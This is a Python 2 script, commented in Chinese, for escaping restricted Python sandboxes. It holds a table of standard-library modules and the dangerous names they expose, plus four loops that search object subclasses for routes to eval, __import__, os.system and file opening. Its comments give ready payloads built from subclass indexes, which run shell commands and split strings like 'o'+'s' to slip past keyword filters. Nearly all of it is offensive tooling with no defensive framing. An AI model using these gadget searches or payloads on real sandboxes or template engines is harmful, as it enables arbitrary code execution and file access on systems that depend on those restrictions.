# coding=UTF-8
# Python2
find_modules = {'filecmp': ['os', '__builtins__'], 'heapq': ['__builtins__'], 'code': ['sys', '__builtins__'],
                'hotshot': ['__builtins__'], 'distutils': ['sys', '__builtins__'], 'functools': ['__builtins__'],
                'random': ['__builtins__'], 'tty': ['sys', '__builtins__'], 'subprocess': ['os', 'sys', '__builtins__'],
                'sysconfig': ['os', 'sys', '__builtins__'], 'whichdb': ['os', 'sys', '__builtins__'],
                'runpy': ['sys', '__builtins__'], 'pty': ['os', 'sys', '__builtins__'],
                'plat-atheos': ['os', 'sys', '__builtins__'], 'xml': ['__builtins__'], 'sgmllib': ['__builtins__'],
                'importlib': ['sys', '__builtins__'], 'UserList': ['__builtins__'], 'tempfile': ['__builtins__'],
                'mimify': ['sys', '__builtins__'], 'pprint': ['__builtins__'],
                'platform': ['os', 'platform', 'sys', '__builtins__'], 'collections': ['__builtins__'],
                'cProfile': ['__builtins__'], 'smtplib': ['__builtins__'], 'compiler': ['__builtins__', 'compile'],
                'string': ['__builtins__'], 'SocketServer': ['os', 'sys', '__builtins__'],
                'plat-darwin': ['os', 'sys', '__builtins__'], 'zipfile': ['os', 'sys', '__builtins__'],
                'repr': ['__builtins__'], 'wave': ['sys', '__builtins__', 'open'], 'curses': ['__builtins__'],
                'antigravity': ['__builtins__'], 'plat-irix6': ['os', 'sys', '__builtins__'],
                'plat-freebsd6': ['os', 'sys', '__builtins__'], 'plat-freebsd7': ['os', 'sys', '__builtins__'],
                'plat-freebsd4': ['os', 'sys', '__builtins__'], 'plat-freebsd5': ['os', 'sys', '__builtins__'],
                'plat-freebsd8': ['os', 'sys', '__builtins__'], 'aifc': ['__builtins__', 'open'],
                'sndhdr': ['__builtins__'], 'cookielib': ['__builtins__'], 'ConfigParser': ['__builtins__'],
                'httplib': ['os', '__builtins__'], '_MozillaCookieJar': ['sys', '__builtins__'],
                'bisect': ['__builtins__'], 'decimal': ['__builtins__'], 'cmd': ['__builtins__'],
                'binhex': ['os', 'sys', '__builtins__'], 'sunau': ['__builtins__', 'open'],
                'pydoc': ['os', 'sys', '__builtins__'], 'plat-riscos': ['os', 'sys', '__builtins__'],
                'token': ['__builtins__'], 'Bastion': ['__builtins__'], 'msilib': ['os', 'sys', '__builtins__'],
                'shlex': ['os', 'sys', '__builtins__'], 'quopri': ['__builtins__'],
                'multiprocessing': ['os', 'sys', '__builtins__'], 'dummy_threading': ['__builtins__'],
                'dircache': ['os', '__builtins__'], 'asyncore': ['os', 'sys', '__builtins__'],
                'pkgutil': ['os', 'sys', '__builtins__'], 'compileall': ['os', 'sys', '__builtins__'],
                'SimpleHTTPServer': ['os', 'sys', '__builtins__'], 'locale': ['sys', '__builtins__'],
                'chunk': ['__builtins__'], 'macpath': ['os', '__builtins__'], 'popen2': ['os', 'sys', '__builtins__'],
                'mimetypes': ['os', 'sys', '__builtins__'], 'toaiff': ['os', '__builtins__'],
                'atexit': ['sys', '__builtins__'], 'pydoc_data': ['__builtins__'],
                'tabnanny': ['os', 'sys', '__builtins__'], 'HTMLParser': ['__builtins__'],
                'encodings': ['codecs', '__builtins__'], 'BaseHTTPServer': ['sys', '__builtins__'],
                'calendar': ['sys', '__builtins__'], 'mailcap': ['os', '__builtins__'],
                'plat-unixware7': ['os', 'sys', '__builtins__'], 'abc': ['__builtins__'], 'plistlib': ['__builtins__'],
                'bdb': ['os', 'sys', '__builtins__'], 'py_compile': ['os', 'sys', '__builtins__', 'compile'],
                'pipes': ['os', '__builtins__'], 'rfc822': ['__builtins__'],
                'tarfile': ['os', 'sys', '__builtins__', 'open'], 'struct': ['__builtins__'],
                'urllib': ['os', 'sys', '__builtins__'], 'fpformat': ['__builtins__'],
                're': ['sys', '__builtins__', 'compile'], 'mutex': ['__builtins__'],
                'ntpath': ['os', 'sys', '__builtins__'], 'UserString': ['sys', '__builtins__'], 'new': ['__builtins__'],
                'formatter': ['sys', '__builtins__'], 'email': ['sys', '__builtins__'],
                'cgi': ['os', 'sys', '__builtins__'], 'ftplib': ['os', 'sys', '__builtins__'],
                'plat-linux2': ['os', 'sys', '__builtins__'], 'ast': ['__builtins__'],
                'optparse': ['os', 'sys', '__builtins__'], 'UserDict': ['__builtins__'],
                'inspect': ['os', 'sys', '__builtins__'], 'mailbox': ['os', 'sys', '__builtins__'],
                'Queue': ['__builtins__'], 'fnmatch': ['__builtins__'], 'ctypes': ['__builtins__'],
                'codecs': ['sys', '__builtins__', 'open'], 'getopt': ['os', '__builtins__'], 'md5': ['__builtins__'],
                'cgitb': ['os', 'sys', '__builtins__'], 'commands': ['__builtins__'],
                'logging': ['os', 'codecs', 'sys', '__builtins__'], 'socket': ['os', 'sys', '__builtins__'],
                'plat-irix5': ['os', 'sys', '__builtins__'], 'sre': ['__builtins__', 'compile'],
                'ensurepip': ['os', 'sys', '__builtins__'], 'DocXMLRPCServer': ['sys', '__builtins__'],
                'traceback': ['sys', '__builtins__'], 'netrc': ['os', '__builtins__'], 'wsgiref': ['__builtins__'],
                'plat-generic': ['os', 'sys', '__builtins__'], 'weakref': ['__builtins__'],
                'ihooks': ['os', 'sys', '__builtins__'], 'telnetlib': ['sys', '__builtins__'],
                'doctest': ['os', 'sys', '__builtins__'], 'pstats': ['os', 'sys', '__builtins__'],
                'smtpd': ['os', 'sys', '__builtins__'], '_pyio': ['os', 'codecs', 'sys', '__builtins__', 'open'],
                'dis': ['sys', '__builtins__'], 'os': ['sys', '__builtins__', 'open'],
                'pdb': ['os', 'sys', '__builtins__'], 'this': ['__builtins__'], 'base64': ['__builtins__'],
                'os2emxpath': ['os', '__builtins__'], 'glob': ['os', 'sys', '__builtins__'],
                'unittest': ['__builtins__'], 'dummy_thread': ['__builtins__'],
                'fileinput': ['os', 'sys', '__builtins__'], '__future__': ['__builtins__'],
                'robotparser': ['__builtins__'], 'plat-mac': ['os', 'sys', '__builtins__'],
                '_threading_local': ['__builtins__'], '_LWPCookieJar': ['sys', '__builtins__'],
                'wsgiref.egg-info': ['os', 'sys', '__builtins__'], 'sha': ['__builtins__'],
                'sre_constants': ['__builtins__'], 'json': ['__builtins__'], 'Cookie': ['__builtins__'],
                'tokenize': ['__builtins__'], 'plat-beos5': ['os', 'sys', '__builtins__'],
                'rexec': ['os', 'sys', '__builtins__'], 'lib-tk': ['__builtins__'], 'textwrap': ['__builtins__'],
                'fractions': ['__builtins__'], 'sqlite3': ['__builtins__'], 'posixfile': ['__builtins__', 'open'],
                'imaplib': ['subprocess', 'sys', '__builtins__'], 'xdrlib': ['__builtins__'],
                'imghdr': ['__builtins__'], 'macurl2path': ['os', '__builtins__'],
                '_osx_support': ['os', 'sys', '__builtins__'],
                'webbrowser': ['os', 'subprocess', 'sys', '__builtins__', 'open'],
                'plat-netbsd1': ['os', 'sys', '__builtins__'], 'nturl2path': ['__builtins__'],
                'tkinter': ['__builtins__'], 'copy': ['__builtins__'], 'pickletools': ['__builtins__'],
                'hashlib': ['__builtins__'], 'anydbm': ['__builtins__', 'open'], 'keyword': ['__builtins__'],
                'timeit': ['timeit', 'sys', '__builtins__'], 'uu': ['os', 'sys', '__builtins__'],
                'StringIO': ['__builtins__'], 'modulefinder': ['os', 'sys', '__builtins__'],
                'stringprep': ['__builtins__'], 'markupbase': ['__builtins__'], 'colorsys': ['__builtins__'],
                'shelve': ['__builtins__', 'open'], 'multifile': ['__builtins__'], 'sre_parse': ['sys', '__builtins__'],
                'pickle': ['sys', '__builtins__'], 'plat-os2emx': ['os', 'sys', '__builtins__'],
                'mimetools': ['os', 'sys', '__builtins__'], 'audiodev': ['__builtins__'], 'copy_reg': ['__builtins__'],
                'sre_compile': ['sys', '__builtins__', 'compile'], 'CGIHTTPServer': ['os', 'sys', '__builtins__'],
                'idlelib': ['__builtins__'], 'site': ['os', 'sys', '__builtins__'],
                'getpass': ['os', 'sys', '__builtins__'], 'imputil': ['sys', '__builtins__'],
                'bsddb': ['os', 'sys', '__builtins__'], 'contextlib': ['sys', '__builtins__'],
                'numbers': ['__builtins__'], 'io': ['__builtins__', 'open'],
                'plat-sunos5': ['os', 'sys', '__builtins__'], 'symtable': ['__builtins__'],
                'pyclbr': ['sys', '__builtins__'], 'shutil': ['os', 'sys', '__builtins__'], 'lib2to3': ['__builtins__'],
                'threading': ['__builtins__'], 'dbhash': ['sys', '__builtins__', 'open'],
                'gettext': ['os', 'sys', '__builtins__'], 'dumbdbm': ['__builtins__', 'open'],
                '_weakrefset': ['__builtins__'], '_abcoll': ['sys', '__builtins__'], 'MimeWriter': ['__builtins__'],
                'test': ['__builtins__'], 'opcode': ['__builtins__'], 'csv': ['__builtins__'],
                'nntplib': ['__builtins__'], 'profile': ['os', 'sys', '__builtins__'],
                'genericpath': ['os', '__builtins__'], 'stat': ['__builtins__'], '__phello__.foo': ['__builtins__'],
                'sched': ['__builtins__'], 'statvfs': ['__builtins__'], 'trace': ['os', 'sys', '__builtins__'],
                'warnings': ['sys', '__builtins__'], 'symbol': ['__builtins__'], 'sets': ['__builtins__'],
                'htmlentitydefs': ['__builtins__'], 'urllib2': ['os', 'sys', '__builtins__'],
                'SimpleXMLRPCServer': ['os', 'sys', '__builtins__'], 'sunaudio': ['__builtins__'],
                'pdb.doc': ['os', '__builtins__'], 'asynchat': ['__builtins__'], 'user': ['os', '__builtins__'],
                'xmllib': ['__builtins__'], 'codeop': ['__builtins__'], 'plat-next3': ['os', 'sys', '__builtins__'],
                'types': ['__builtins__'], 'argparse': ['__builtins__'], 'uuid': ['os', 'sys', '__builtins__'],
                'plat-aix4': ['os', 'sys', '__builtins__'], 'plat-aix3': ['os', 'sys', '__builtins__'],
                'ssl': ['os', 'sys', '__builtins__'], 'poplib': ['__builtins__'], 'xmlrpclib': ['__builtins__'],
                'difflib': ['__builtins__'], 'urlparse': ['__builtins__'], 'linecache': ['os', 'sys', '__builtins__'],
                '_strptime': ['__builtins__'], 'htmllib': ['__builtins__'], 'site-packages': ['__builtins__'],
                'posixpath': ['os', 'sys', '__builtins__'], 'stringold': ['__builtins__'],
                'gzip': ['os', 'sys', '__builtins__', 'open'], 'mhlib': ['os', 'sys', '__builtins__'],
                'rlcompleter': ['__builtins__'], 'hmac': ['__builtins__']}
target_modules = ['os', 'platform', 'subprocess', 'timeit', 'importlib', 'codecs', 'sys']
target_functions = ['__import__', '__builtins__', 'exec', 'eval', 'execfile', 'compile', 'file', 'open']
all_targets = list(set(find_modules.keys() + target_modules + target_functions))
all_modules = list(set(find_modules.keys() + target_modules))
subclasses = ().__class__.__bases__[0].__subclasses__()
sub_name = [s.__name__ for s in subclasses]
# 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()
print('----------1-----------')
for i, s in enumerate(sub_name):
    for f in all_targets:
        if f == s:
            if f in target_functions:
                print(i, f)
            elif f in all_modules:
                target = find_modules[f]
                sub_dict = subclasses[i].__dict__
                for t in target:
                    if t in sub_dict:
                        print(i, f, target)
print('----------2-----------')
# 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
for i, sub in enumerate(subclasses):
    try:
        more = sub.__init__.func_globals
        for m in all_targets:
            if m in more:
                print(i, sub, m, find_modules.get(m))
    except Exception as e:
        pass
print('----------3-----------')
# 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").system("ls")')
for i, sub in enumerate(subclasses):
    try:
        more = sub.__init__.func_globals.values()
        for j, v in enumerate(more):
            for f in all_targets:
                try:
                    if f in v:
                        if f in target_functions:
                            print(i, j, sub, f)
                        elif f in all_modules:
                            target = find_modules.get(f)
                            sub_dict = v[f].__dict__
                            for t in target:
                                if t in sub_dict:
                                    print(i, j, sub, f, target)
                except Exception as e:
                    pass
    except Exception as e:
        pass
print('----------4-----------')
# 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")
# <class 'warnings.catch_warnings'>类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似
for i, sub in enumerate(subclasses):
    try:
        more = sub()._module.__builtins__
        for f in all_targets:
            if f in more:
                print(i, f)
    except Exception as e:
        pass